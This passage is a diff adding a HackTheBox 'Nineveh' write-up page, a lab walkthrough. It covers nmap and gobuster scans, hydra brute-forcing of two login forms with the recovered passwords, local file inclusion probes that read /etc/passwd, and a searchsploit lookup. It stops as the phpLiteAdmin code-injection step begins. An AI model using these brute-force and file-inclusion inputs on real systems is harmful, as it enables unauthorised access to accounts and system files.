@@ -1,0 +1,667 @@
+<!DOCTYPE html>
+<html>
+  <head>
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <title>pwncone.io</title>
+    <link rel="stylesheet" href="../../../../css/style.css">
+  </head>
+
+<body>
+
+<section>
+
+    <writeup>
+        <h1><strong>hackthebox Nineveh</strong></h1>
+        <em>Released: 4th August 2017 / Pwned: 25th September 2019 - [+] Solved whilst Retired</em><br>
+        <br>
+        <img alt="images\2-1.png" src="images/2-1.png"><br>
+        <br>
+        Nineveh is a box of many steps.<br>
+        <br>
+        <a id="h3-1" name="h3-1"></a><strong></strong>
+        <h4><strong>Summary</strong></h4>
+        • Brute-force for directories on HTTP site, and brute-force found login page<br>
+        • Brute-force for directories on HTTPS site, and brute-force found login page<br>
+        • Exploit the service running on HTTPS with remote code injection, and activate the injected code via an LFI over on the HTTP site to get a shell<br>
+        • Extract a system user's SSH private key from an image in a secure_notes folder<br>
+        • Read the mail available on the system and perform port knocking to open port 22, the SSH port<br>
+        • Run pspy against the system to run a root script running chkrootkit. Exploit chkrootkit with its classic vuln to get root<br>
+        <br>
+        <a id="h2-1" name="h2-1"></a><strong></strong>
+        <h2><strong>1) Nmap</strong></h2><br>
+        Initial all-ports scan to find all open TCP ports on the box:<br>
+        <code>nmap -p- -T4 -oN nmap/tcp-allports.txt 10.10.10.43</code><br>
+        <br>
+        Service detection, default scripts and OS detection against open ports:<br>
+        <code>nmap -p 80,443 -T4 -sV -sC -O -oN nmap/tcp-openports.txt 10.10.10.43</code><br>
+        <br>
+        -sV service enumeration<br>
+        -sC default scripts<br>
+        -O OS detection<br>
+        -oN default output<br>
+        <br>
+        Results:<br>
+            <div class="codebox">
+                root@gotham<span style="color:#ff9d00;font-weight:700">:</span>~<span style="color:#ff9d00;font-weight:700">/</span>ctf<span style="color:#ff9d00;font-weight:700">/</span>nineveh#&nbsp;<span style="color:#ff9d00;font-weight:700">mkdir</span>&nbsp;nmap<br>
+                root@gotham<span style="color:#ff9d00;font-weight:700">:</span>~<span style="color:#ff9d00;font-weight:700">/</span>ctf<span style="color:#ff9d00;font-weight:700">/</span>nineveh#&nbsp;nmap&nbsp;-p-&nbsp;-T4&nbsp;-oN&nbsp;nmap<span style="color:#ff9d00;font-weight:700">/</span>tcp-allports.txt&nbsp;10.10.10.43<br>
+                [...]<br>
+                <br>
+                PORT&nbsp;&nbsp;&nbsp;&nbsp;STATE&nbsp;SERVICE<br>
+                80<span style="color:#ff9d00;font-weight:700">/</span>tcp&nbsp;&nbsp;open&nbsp;&nbsp;http<br>
+                443<span style="color:#ff9d00;font-weight:700">/</span>tcp&nbsp;open&nbsp;&nbsp;https<br>
+                <br>
+                root@gotham<span style="color:#ff9d00;font-weight:700">:</span>~<span style="color:#ff9d00;font-weight:700">/</span>ctf<span style="color:#ff9d00;font-weight:700">/</span>nineveh#&nbsp;nmap&nbsp;-p&nbsp;80,443&nbsp;-T4&nbsp;-sV&nbsp;-sC&nbsp;-O&nbsp;-oN&nbsp;nmap<span style="color:#ff9d00;font-weight:700">/</span>tcp-openports.txt&nbsp;10.10.10.43<br>
+                [...]<br>
+                <br>
+                PORT&nbsp;&nbsp;&nbsp;&nbsp;STATE&nbsp;SERVICE&nbsp;&nbsp;VERSION<br>
+                80<span style="color:#ff9d00;font-weight:700">/</span>tcp&nbsp;&nbsp;open&nbsp;&nbsp;http&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Apache&nbsp;httpd&nbsp;2.4.18&nbsp;<span style="color:#ff9d00;font-weight:700">((</span>Ubuntu<span style="color:#ff9d00;font-weight:700">))</span><br>
+                <span style="color:#ff9d00;font-weight:700">|</span>_http-server-header<span style="color:#ff9d00;font-weight:700">:</span>&nbsp;Apache<span style="color:#ff9d00;font-weight:700">/</span>2.4.18&nbsp;<span style="color:#ff9d00;font-weight:700">(</span>Ubuntu<span style="color:#ff9d00;font-weight:700">)</span><br>
+                <span style="color:#ff9d00;font-weight:700">|</span>_http-title<span style="color:#ff9d00;font-weight:700">:</span>&nbsp;Site&nbsp;doesnt&nbsp;have&nbsp;a&nbsp;title&nbsp;<span style="color:#ff9d00;font-weight:700">(</span>text<span style="color:#ff9d00;font-weight:700">/</span>html<span style="color:#ff9d00;font-weight:700">)</span>.<br>
+                443<span style="color:#ff9d00;font-weight:700">/</span>tcp&nbsp;open&nbsp;&nbsp;ssl<span style="color:#ff9d00;font-weight:700">/</span>http&nbsp;Apache&nbsp;httpd&nbsp;2.4.18&nbsp;<span style="color:#ff9d00;font-weight:700">((</span>Ubuntu<span style="color:#ff9d00;font-weight:700">))</span><br>
+                <span style="color:#ff9d00;font-weight:700">|</span>_http-server-header<span style="color:#ff9d00;font-weight:700">:</span>&nbsp;Apache<span style="color:#ff9d00;font-weight:700">/</span>2.4.18&nbsp;<span style="color:#ff9d00;font-weight:700">(</span>Ubuntu<span style="color:#ff9d00;font-weight:700">)</span><br>
+                <span style="color:#ff9d00;font-weight:700">|</span>_http-title<span style="color:#ff9d00;font-weight:700">:</span>&nbsp;Site&nbsp;doesnt&nbsp;have&nbsp;a&nbsp;title&nbsp;<span style="color:#ff9d00;font-weight:700">(</span>text<span style="color:#ff9d00;font-weight:700">/</span>html<span style="color:#ff9d00;font-weight:700">)</span>.<br>
+                <span style="color:#ff9d00;font-weight:700">|</span>&nbsp;ssl-cert<span style="color:#ff9d00;font-weight:700">:</span>&nbsp;Subject<span style="color:#ff9d00;font-weight:700">:</span>&nbsp;commonName=nineveh.htb<span style="color:#ff9d00;font-weight:700">/</span>organizationName=HackTheBox&nbsp;Ltd<span style="color:#ff9d00;font-weight:700">/</span>stateOrProvinceName=Athens<span style="color:#ff9d00;font-weight:700">/</span>countryName=GR<br>
+                <span style="color:#ff9d00;font-weight:700">|</span>&nbsp;Not&nbsp;valid&nbsp;before<span style="color:#ff9d00;font-weight:700">:</span>&nbsp;2017-07-01T15<span style="color:#ff9d00;font-weight:700">:</span>03<span style="color:#ff9d00;font-weight:700">:</span>30<br>
+                <span style="color:#ff9d00;font-weight:700">|</span>_Not&nbsp;valid&nbsp;after<span style="color:#ff9d00;font-weight:700">:</span>&nbsp;&nbsp;2018-07-01T15<span style="color:#ff9d00;font-weight:700">:</span>03<span style="color:#ff9d00;font-weight:700">:</span>30<br>
+                <span style="color:#ff9d00;font-weight:700">|</span>_ssl-date<span style="color:#ff9d00;font-weight:700">:</span>&nbsp;TLS&nbsp;randomness&nbsp;does&nbsp;not&nbsp;represent&nbsp;time<br>
+                <span style="color:#ff9d00;font-weight:700">|</span>&nbsp;tls-alpn<span style="color:#ff9d00;font-weight:700">:</span>&nbsp;<br>
+                <span style="color:#ff9d00;font-weight:700">|</span>_&nbsp;&nbsp;http<span style="color:#ff9d00;font-weight:700">/</span>1.1<br>
+                Warning<span style="color:#ff9d00;font-weight:700">:</span>&nbsp;OSScan&nbsp;results&nbsp;may&nbsp;be&nbsp;unreliable&nbsp;because&nbsp;we&nbsp;could&nbsp;not&nbsp;<span style="color:#ff9d00;font-weight:700">find</span>&nbsp;at&nbsp;least&nbsp;1&nbsp;open&nbsp;and&nbsp;1&nbsp;closed&nbsp;port<br>
+                Aggressive&nbsp;OS&nbsp;guesses<span style="color:#ff9d00;font-weight:700">:</span>&nbsp;Linux&nbsp;3.10&nbsp;-&nbsp;4.11&nbsp;<span style="color:#ff9d00;font-weight:700">(</span>92%<span style="color:#ff9d00;font-weight:700">)</span>,&nbsp;<br>
+                [...]
+            </div>
+        </div><br>
+        <br>
+        Results analysis:<br>
+        • 80/http and 443/https - A webserver is running, which is often a good sign because they have a large attack surface<br>
+        <br>
+        <a id="h2-2" name="h2-2"></a><strong></strong>
+        <h2><strong>2) 80/http</strong></h2><br>
+        <code>http://10.10.10.43</code> is a default page.<br>
+        <img alt="images\2-2.png" src="images/2-2.png"><br>
+        <br>
+        Gobuster the http site, and you'll find a <code>/department</code> directory.<br>
+            <div class="codebox">
+                root@gotham<span style="color:#ff9d00;font-weight:700">:</span>~<span style="color:#ff9d00;font-weight:700">/</span>ctf<span style="color:#ff9d00;font-weight:700">/</span>nineveh<span style="color:#ff9d00;font-weight:700">/</span>80#&nbsp;gobuster&nbsp;<span style="color:#ff9d00;font-weight:700">dir</span>&nbsp;-e&nbsp;-u&nbsp;http<span style="color:#ff9d00;font-weight:700">://</span>10.10.10.43&nbsp;-w&nbsp;<span style="color:#ff9d00;font-weight:700">/</span>usr<span style="color:#ff9d00;font-weight:700">/</span>share<span style="color:#ff9d00;font-weight:700">/</span>seclists<span style="color:#ff9d00;font-weight:700">/</span>Discovery<span style="color:#ff9d00;font-weight:700">/</span>Web-Content<span style="color:#ff9d00;font-weight:700">/</span>big.txt&nbsp;-o&nbsp;gb-big.txt<br>
+                ===============================================================<br>
+                Gobuster&nbsp;v3.0.1<br>
+                by&nbsp;OJ&nbsp;Reeves&nbsp;<span style="color:#ff9d00;font-weight:700">(</span>@TheColonial<span style="color:#ff9d00;font-weight:700">)</span>&nbsp;<span style="color:#ff9d00;font-weight:700">&amp;</span>&nbsp;Christian&nbsp;Mehlmauer&nbsp;<span style="color:#ff9d00;font-weight:700">(</span>@_FireFart_<span style="color:#ff9d00;font-weight:700">)</span><br>
+                ===============================================================<br>
+                [+]&nbsp;Url<span style="color:#ff9d00;font-weight:700">:</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;http<span style="color:#ff9d00;font-weight:700">://</span>10.10.10.43<br>
+                [+]&nbsp;Threads<span style="color:#ff9d00;font-weight:700">:</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;10<br>
+                [+]&nbsp;Wordlist<span style="color:#ff9d00;font-weight:700">:</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#ff9d00;font-weight:700">/</span>usr<span style="color:#ff9d00;font-weight:700">/</span>share<span style="color:#ff9d00;font-weight:700">/</span>seclists<span style="color:#ff9d00;font-weight:700">/</span>Discovery<span style="color:#ff9d00;font-weight:700">/</span>Web-Content<span style="color:#ff9d00;font-weight:700">/</span>big.txt<br>
+                [+]&nbsp;Status&nbsp;codes<span style="color:#ff9d00;font-weight:700">:</span>&nbsp;&nbsp;&nbsp;200,204,301,302,307,401,403<br>
+                [+]&nbsp;User&nbsp;Agent<span style="color:#ff9d00;font-weight:700">:</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;gobuster<span style="color:#ff9d00;font-weight:700">/</span>3.0.1<br>
+                [+]&nbsp;Expanded<span style="color:#ff9d00;font-weight:700">:</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#ff9d00;font-weight:700">true</span><br>
+                [+]&nbsp;Timeout<span style="color:#ff9d00;font-weight:700">:</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;10s<br>
+                ===============================================================<br>
+                http<span style="color:#ff9d00;font-weight:700">://</span>10.10.10.43<span style="color:#ff9d00;font-weight:700">/</span>.htaccess&nbsp;<span style="color:#ff9d00;font-weight:700">(</span>Status<span style="color:#ff9d00;font-weight:700">:</span>&nbsp;403<span style="color:#ff9d00;font-weight:700">)</span><br>
+                http<span style="color:#ff9d00;font-weight:700">://</span>10.10.10.43<span style="color:#ff9d00;font-weight:700">/</span>.htpasswd&nbsp;<span style="color:#ff9d00;font-weight:700">(</span>Status<span style="color:#ff9d00;font-weight:700">:</span>&nbsp;403<span style="color:#ff9d00;font-weight:700">)</span><br>
+                http<span style="color:#ff9d00;font-weight:700">://</span>10.10.10.43<span style="color:#ff9d00;font-weight:700">/</span>department&nbsp;<span style="color:#ff9d00;font-weight:700">(</span>Status<span style="color:#ff9d00;font-weight:700">:</span>&nbsp;301<span style="color:#ff9d00;font-weight:700">)</span><br>
+                http<span style="color:#ff9d00;font-weight:700">://</span>10.10.10.43<span style="color:#ff9d00;font-weight:700">/</span>server-status&nbsp;<span style="color:#ff9d00;font-weight:700">(</span>Status<span style="color:#ff9d00;font-weight:700">:</span>&nbsp;403<span style="color:#ff9d00;font-weight:700">)</span>
+            </div>
+        </div><br>
+        <br>
+        <a id="h3-2" name="h3-2"></a><strong></strong>
+        <h3><strong>2a) /department Brute-force</strong></h3><br>
+        <code>/department</code> directs you to a login page.<br>
+        <img alt="images\2-3.png" src="images/2-3.png"><br>
+        <br>
+        After enumerating the site for a while, there was nothing to indicate that that were any other goings-on with the site, so I decided to brute-force the login page.<br>
+        <br>
+        You can grab a login request by proxying your traffic through burp.<br>
+        Fill that data into hydra and brute-force the login form.<br>
+            <div class="codebox">
+                root@gotham<span style="color:#ff9d00;font-weight:700">:</span>~<span style="color:#ff9d00;font-weight:700">/</span>ctf<span style="color:#ff9d00;font-weight:700">/</span>nineveh<span style="color:#ff9d00;font-weight:700">/</span>80#&nbsp;hydra&nbsp;-v&nbsp;-l&nbsp;admin&nbsp;-P&nbsp;<span style="color:#ff9d00;font-weight:700">/</span>usr<span style="color:#ff9d00;font-weight:700">/</span>share<span style="color:#ff9d00;font-weight:700">/</span>seclists<span style="color:#ff9d00;font-weight:700">/</span>Passwords<span style="color:#ff9d00;font-weight:700">/</span>darkweb2017-top100.txt&nbsp;-o&nbsp;hydra_http-pass.txt&nbsp;-t&nbsp;50&nbsp;10.10.10.43&nbsp;http-post-form&nbsp;<span style="color:#3ad900;font-weight:400">"/department/login.php:username=admin&amp;password=^PASS^:F=Invalid&nbsp;password!"</span>&nbsp;-f<br>
+                [...]<br>
+                [DATA]&nbsp;max&nbsp;50&nbsp;tasks&nbsp;per&nbsp;1&nbsp;server,&nbsp;overall&nbsp;50&nbsp;tasks,&nbsp;99&nbsp;<span style="color:#ff9d00;font-weight:700">login</span>&nbsp;tries&nbsp;<span style="color:#ff9d00;font-weight:700">(</span>l<span style="color:#ff9d00;font-weight:700">:</span>1<span style="color:#ff9d00;font-weight:700">/</span>p<span style="color:#ff9d00;font-weight:700">:</span>0<span style="color:#ff9d00;font-weight:700">)</span>,&nbsp;~99&nbsp;tries&nbsp;per&nbsp;task<br>
+                [DATA]&nbsp;attacking&nbsp;http-post-form<span style="color:#ff9d00;font-weight:700">://</span>10.10.10.43<span style="color:#ff9d00;font-weight:700">:</span>80<span style="color:#ff9d00;font-weight:700">/</span>department<span style="color:#ff9d00;font-weight:700">/</span>login.php<span style="color:#ff9d00;font-weight:700">:</span>username=admin<span style="color:#ff9d00;font-weight:700">&amp;</span>password=^PASS^<span style="color:#ff9d00;font-weight:700">:</span>F=Invalid&nbsp;password<span style="color:#ff9d00;font-weight:700">!</span><br>
+                [VERBOSE]&nbsp;Resolving&nbsp;addresses&nbsp;...&nbsp;[VERBOSE]&nbsp;resolving&nbsp;<span style="color:#ff9d00;font-weight:700">done</span><br>
+                [VERBOSE]&nbsp;Page&nbsp;redirected&nbsp;to&nbsp;http<span style="color:#ff9d00;font-weight:700">://</span>10.10.10.43<span style="color:#ff9d00;font-weight:700">/</span>department<span style="color:#ff9d00;font-weight:700">/</span>manage.php<br>
+                [80][http-post-form]&nbsp;host<span style="color:#ff9d00;font-weight:700">:</span>&nbsp;10.10.10.43&nbsp;&nbsp;&nbsp;<span style="color:#ff9d00;font-weight:700">login:</span>&nbsp;admin&nbsp;&nbsp;&nbsp;password<span style="color:#ff9d00;font-weight:700">:</span>&nbsp;1q2w3e4r5t<br>
+                [STATUS]&nbsp;attack&nbsp;finished&nbsp;<span style="color:#ff9d00;font-weight:700">for</span>&nbsp;<span style="color:#7f0044;font-weight:400">10</span>.10.10.43&nbsp;(valid&nbsp;pair&nbsp;found)
+            </div>
+        </div><br>
+        <br>
+        It worked!<br>
+        login: <code>admin</code> password<strong>:</strong> <code>1q2w3e4r5t</code><br>
+        <br>
+        <a id="h3-3" name="h3-3"></a><strong></strong>
+        <h3><strong>2b) /manage.php LFI</strong></h3><br>
+        After logging in, you're redirected to <code>/department/manage.php</code><br>
+        <img alt="images\2-4.png" src="images/2-4.png"><br>
+        <br>
+        <code>Notes</code> links a set of notes left by <code>amrois</code> for the admin.<br>
+        <img alt="images\2-5.png" src="images/2-5.png"><br>
+        <br>
+        The URL of the notes looks like it's including a <code>.txt</code> file on the web server - <code>http://10.10.10.43/department/manage.php?notes=files/ninevehNotes.txt</code> - and looks vulnerable to file inclusion.<br>
+        <br>
+        But some of the initial standard tests fail:<br>
+        <code>/manage.php?notes=../../../../../../etc/passwd</code><br>
+        <code>/manage.php?notes=../../../../../../etc/passwd%00</code><br>
+        <code>/manage.php?notes=php://filter/convert.base64-encode/resource=manage.php</code><br>
+        <img alt="images\2-6.png" src="images/2-6.png"><br>
+        <br>
+        However, including <code>ninevehNotes.txt</code> (in multiple different fashions) prints an error message.<br>
+        <code>/department/manage.php?notes=./ninevehNotes.txt</code><br>
+        <code>/department/manage.php?notes=hey/ninevehNotes.txt</code><br>
+        <code>department/manage.php?notes=/etc/ninevehNotes.txt</code><br>
+        <img alt="images\2-7.png" src="images/2-7.png"><br>
+        <br>
+        You can also produce the error message if you include ninevehNotes with different file extensions.<br>
+        <code>/department/manage.php?notes=hey/ninevehNotes.php</code><br>
+        <code>/department/manage.php?notes=hey/ninevehNotes.py</code><br>
+        <img alt="images\2-8.png" src="images/2-8.png"><br>
+        <br>
+        This implied to me that <code>manage.php</code> would only include files named <code>ninevehNotes</code>, and that it would include files from all over the operating system providing they were named <code>ninevehNotes</code>.<br>
+        <br>
+        If this is true, there's no way to exploit the LFI here (unless maybe you bruteforce the entire filesystem for ninevehNotes files, which would probably be pointless), so I moved on to examine the HTTPS site.<br>
+        <br>
+        <a id="h2-3" name="h2-3"></a><strong></strong>
+        <h2><strong>3) 443/https</strong></h2><br>
+        <code>https://10.10.10.43</code> is a pair of happy individuals.<br>
+        <img alt="images\2-9.png" src="images/2-9.png"><br>
+        <br>
+        Gobuster the site, and you'll find a <code>/db</code> directory.<br>
+            <div class="codebox">
+                root@gotham<span style="color:#ff9d00;font-weight:700">:</span>~<span style="color:#ff9d00;font-weight:700">/</span>ctf<span style="color:#ff9d00;font-weight:700">/</span>nineveh<span style="color:#ff9d00;font-weight:700">/</span>443#&nbsp;gobuster&nbsp;<span style="color:#ff9d00;font-weight:700">dir</span>&nbsp;-e&nbsp;-u&nbsp;https<span style="color:#ff9d00;font-weight:700">://</span>10.10.10.43&nbsp;-w&nbsp;<span style="color:#ff9d00;font-weight:700">/</span>usr<span style="color:#ff9d00;font-weight:700">/</span>share<span style="color:#ff9d00;font-weight:700">/</span>seclists<span style="color:#ff9d00;font-weight:700">/</span>Discovery<span style="color:#ff9d00;font-weight:700">/</span>Web-Content<span style="color:#ff9d00;font-weight:700">/</span>big.txt&nbsp;-o&nbsp;gb-big.txt&nbsp;-k<br>
+                ===============================================================<br>
+                Gobuster&nbsp;v3.0.1<br>
+                by&nbsp;OJ&nbsp;Reeves&nbsp;<span style="color:#ff9d00;font-weight:700">(</span>@TheColonial<span style="color:#ff9d00;font-weight:700">)</span>&nbsp;<span style="color:#ff9d00;font-weight:700">&amp;</span>&nbsp;Christian&nbsp;Mehlmauer&nbsp;<span style="color:#ff9d00;font-weight:700">(</span>@_FireFart_<span style="color:#ff9d00;font-weight:700">)</span><br>
+                ===============================================================<br>
+                [+]&nbsp;Url<span style="color:#ff9d00;font-weight:700">:</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;https<span style="color:#ff9d00;font-weight:700">://</span>10.10.10.43<br>
+                [+]&nbsp;Threads<span style="color:#ff9d00;font-weight:700">:</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;10<br>
+                [+]&nbsp;Wordlist<span style="color:#ff9d00;font-weight:700">:</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#ff9d00;font-weight:700">/</span>usr<span style="color:#ff9d00;font-weight:700">/</span>share<span style="color:#ff9d00;font-weight:700">/</span>seclists<span style="color:#ff9d00;font-weight:700">/</span>Discovery<span style="color:#ff9d00;font-weight:700">/</span>Web-Content<span style="color:#ff9d00;font-weight:700">/</span>big.txt<br>
+                [+]&nbsp;Status&nbsp;codes<span style="color:#ff9d00;font-weight:700">:</span>&nbsp;&nbsp;&nbsp;200,204,301,302,307,401,403<br>
+                [+]&nbsp;User&nbsp;Agent<span style="color:#ff9d00;font-weight:700">:</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;gobuster<span style="color:#ff9d00;font-weight:700">/</span>3.0.1<br>
+                [+]&nbsp;Expanded<span style="color:#ff9d00;font-weight:700">:</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#ff9d00;font-weight:700">true</span><br>
+                [+]&nbsp;Timeout<span style="color:#ff9d00;font-weight:700">:</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;10s<br>
+                ===============================================================<br>
+                https<span style="color:#ff9d00;font-weight:700">://</span>10.10.10.43<span style="color:#ff9d00;font-weight:700">/</span>.htaccess&nbsp;<span style="color:#ff9d00;font-weight:700">(</span>Status<span style="color:#ff9d00;font-weight:700">:</span>&nbsp;403<span style="color:#ff9d00;font-weight:700">)</span><br>
+                https<span style="color:#ff9d00;font-weight:700">://</span>10.10.10.43<span style="color:#ff9d00;font-weight:700">/</span>.htpasswd&nbsp;<span style="color:#ff9d00;font-weight:700">(</span>Status<span style="color:#ff9d00;font-weight:700">:</span>&nbsp;403<span style="color:#ff9d00;font-weight:700">)</span><br>
+                https<span style="color:#ff9d00;font-weight:700">://</span>10.10.10.43<span style="color:#ff9d00;font-weight:700">/</span>db&nbsp;<span style="color:#ff9d00;font-weight:700">(</span>Status<span style="color:#ff9d00;font-weight:700">:</span>&nbsp;301<span style="color:#ff9d00;font-weight:700">)</span><br>
+                https<span style="color:#ff9d00;font-weight:700">://</span>10.10.10.43<span style="color:#ff9d00;font-weight:700">/</span>server-status&nbsp;<span style="color:#ff9d00;font-weight:700">(</span>Status<span style="color:#ff9d00;font-weight:700">:</span>&nbsp;403<span style="color:#ff9d00;font-weight:700">)</span>
+            </div>
+        </div><br>
+        <br>
+        <a id="h3-4" name="h3-4"></a><strong></strong>
+        <h3><strong>3a) /db Brute-force</strong></h3><br>
+        Another login form.<br>
+        <img alt="images\2-10.png" src="images/2-10.png"><br>
+        <br>
+        The default phpLiteAdmin password - <code>admin</code> - doesn't work.<br>
+        <br>
+        Hinted at by the HTTP site, I decided brute-forced this login form too.<br>
+        However, you'll need a bigger password list this time.<br>
+        <br>
+        You can run hydra without specifying a username by using an empty pair of single quotemarks - <code>''</code><br>
+            <div class="codebox">
+                root@gotham<span style="color:#ff9d00;font-weight:700">:</span>~<span style="color:#ff9d00;font-weight:700">/</span>ctf<span style="color:#ff9d00;font-weight:700">/</span>nineveh<span style="color:#ff9d00;font-weight:700">/</span>443#&nbsp;hydra&nbsp;-v&nbsp;-l&nbsp;<span style="color:#3ad900;font-weight:400">''</span>&nbsp;-P&nbsp;<span style="color:#ff9d00;font-weight:700">/</span>usr<span style="color:#ff9d00;font-weight:700">/</span>share<span style="color:#ff9d00;font-weight:700">/</span>seclists<span style="color:#ff9d00;font-weight:700">/</span>Passwords<span style="color:#ff9d00;font-weight:700">/</span>darkweb2017-top1000.txt&nbsp;-o&nbsp;hydra_http-pass.txt&nbsp;-t&nbsp;50&nbsp;10.10.10.43&nbsp;https-post-form&nbsp;<span style="color:#3ad900;font-weight:400">"/db/index.php:password=^PASS^&amp;remember=yes&amp;login=Log+In&amp;proc_login=true:F=Incorrect&nbsp;password."</span>&nbsp;-f<br>
+                [...]<br>
+                [DATA]&nbsp;max&nbsp;50&nbsp;tasks&nbsp;per&nbsp;1&nbsp;server,&nbsp;overall&nbsp;50&nbsp;tasks,&nbsp;999&nbsp;<span style="color:#ff9d00;font-weight:700">login</span>&nbsp;tries&nbsp;<span style="color:#ff9d00;font-weight:700">(</span>l<span style="color:#ff9d00;font-weight:700">:</span>1<span style="color:#ff9d00;font-weight:700">/</span>p<span style="color:#ff9d00;font-weight:700">:</span>0<span style="color:#ff9d00;font-weight:700">)</span>,&nbsp;~999&nbsp;tries&nbsp;per&nbsp;task<br>
+                [DATA]&nbsp;attacking&nbsp;http-post-forms<span style="color:#ff9d00;font-weight:700">://</span>10.10.10.43<span style="color:#ff9d00;font-weight:700">:</span>443<span style="color:#ff9d00;font-weight:700">/</span>db<span style="color:#ff9d00;font-weight:700">/</span>index.php<span style="color:#ff9d00;font-weight:700">:</span>password=^PASS^<span style="color:#ff9d00;font-weight:700">&amp;</span>remember=yes<span style="color:#ff9d00;font-weight:700">&amp;login</span>=Log+In<span style="color:#ff9d00;font-weight:700">&amp;</span>proc_login=<span style="color:#ff9d00;font-weight:700">true:</span>F=Incorrect&nbsp;password.<br>
+                [VERBOSE]&nbsp;Resolving&nbsp;addresses&nbsp;...&nbsp;[VERBOSE]&nbsp;resolving&nbsp;<span style="color:#ff9d00;font-weight:700">done</span><br>
+                [443][http-post-form]&nbsp;host<span style="color:#ff9d00;font-weight:700">:</span>&nbsp;10.10.10.43&nbsp;&nbsp;&nbsp;password<span style="color:#ff9d00;font-weight:700">:</span>&nbsp;password123<br>
+                [STATUS]&nbsp;attack&nbsp;finished&nbsp;<span style="color:#ff9d00;font-weight:700">for</span>&nbsp;<span style="color:#7f0044;font-weight:400">10</span>.10.10.43&nbsp;(valid&nbsp;pair&nbsp;found)<br>
+                [...]
+            </div>
+        </div><br>
+        <br>
+        Success! - <code>password123</code><br>
+        <br>
+        <a id="h2-4" name="h2-4"></a><strong></strong>
+        <h2><strong>4) phpLiteAdmin - Remote PHP Code Injection</strong></h2><br>
+        With access to phpLiteAdmin, we can finally make use of some of the available exploits.<br>
+        <br>
+        <code>searchsploit</code> for phpLiteAdmin exploits.<br>
+            <div class="codebox">
+                root@gotham<span style="color:#ff9d00;font-weight:700">:</span>~<span style="color:#ff9d00;font-weight:700">/</span>ctf<span style="color:#ff9d00;font-weight:700">/</span>nineveh#&nbsp;searchsploit&nbsp;-w&nbsp;phpliteadmin<br>
+                ---------------------------------------------------&nbsp;--------------------------------------------<br>
+                &nbsp;Exploit&nbsp;Title&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#ff9d00;font-weight:700">|</span>&nbsp;&nbsp;URL<br>
+                ---------------------------------------------------&nbsp;--------------------------------------------<br>
+                PHPLiteAdmin&nbsp;1.9.3&nbsp;-&nbsp;Remote&nbsp;PHP&nbsp;Code&nbsp;Injection&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#ff9d00;font-weight:700">|</span>&nbsp;https<span style="color:#ff9d00;font-weight:700">://</span>www.exploit-db.com<span style="color:#ff9d00;font-weight:700">/</span>exploits<span style="color:#ff9d00;font-weight:700">/</span>24044<br>
+                phpLiteAdmin&nbsp;-&nbsp;<span style="color:#3ad900;font-weight:400">'table'</span>&nbsp;SQL&nbsp;Injection&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#ff9d00;font-weight:700">|</span>&nbsp;https<span style="color:#ff9d00;font-weight:700">://</span>www.exploit-db.com<span style="color:#ff9d00;font-weight:700">/</span>exploits<span style="color:#ff9d00;font-weight:700">/</span>38228<br>
+                phpLiteAdmin&nbsp;1.1&nbsp;-&nbsp;Multiple&nbsp;Vulnerabilities&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#ff9d00;font-weight:700">|</span>&nbsp;https<span style="color:#ff9d00;font-weight:700">://</span>www.exploit-db.com<span style="color:#ff9d00;font-weight:700">/</span>exploits<span style="color:#ff9d00;font-weight:700">/</span>37515<br>
+                phpLiteAdmin&nbsp;1.9.6&nbsp;-&nbsp;Multiple&nbsp;Vulnerabilities&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#ff9d00;font-weight:700">|</span>&nbsp;https<span style="color:#ff9d00;font-weight:700">://</span>www.exploit-db.com<span style="color:#ff9d00;font-weight:700">/</span>exploits<span style="color:#ff9d00;font-weight:700">/</span>39714<br>
+                ---------------------------------------------------&nbsp;--------------------------------------------<br>
+                Shellcodes<span style="color:#ff9d00;font-weight:700">:</span>&nbsp;No&nbsp;Result
+            </div>
+        </div><br>
+        <br>
+        PHP Code Injection sounds useful :)<br>
+        <br>
+        <a href="https://www.exploit-db.com/exploits/24044">https://www.exploit-db.com/exploits/24044</a><br>
+        The page describes a vulnerability where you can create databases with a .php extension, write php code into one of their tables, and browse to the path of the .php database to execute the code.<br>
+        <br>
+        The images throughout the exploit don't work anymore, but the author has a video demonstration of the exploit on youtube.<br>
+        <a href="https://www.youtube.com/watch?v=G1i5oWblx9Q">https://www.youtube.com/watch?v=G1i5oWblx9Q</a><br>
+        <br>
+        <a id="h3-5" name="h3-5"></a><strong></strong>
+        <h3><strong>4a) PHP Code Injection</strong></h3><br>
+        The exploit requires a bit of modification for it to work against this box.<br>
